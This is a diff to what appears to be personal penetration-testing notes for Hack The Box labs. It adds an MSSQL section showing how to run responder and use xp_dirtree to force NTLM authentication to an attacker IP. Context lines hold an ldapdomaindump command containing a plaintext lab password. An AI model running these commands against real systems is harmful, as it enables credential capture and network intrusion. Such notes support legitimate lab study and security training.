@@ -617,6 +617,19 @@ This tool creates csv files that we can use to view permissions, users, computer
 ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
 ```
 
+###
+
+### MSSQL
+
+SMB relay attack via xp\_dirtree. If we have access to a mssql user we can run responder and execute the command:
+
+<pre><code><strong>sudo responder -I tun0
+</strong></code></pre>
+
+```
+SQL (PublicUser> xp_dirtree \\10.10.16.3\test
+```
+
 ### Linux
 
 linenum
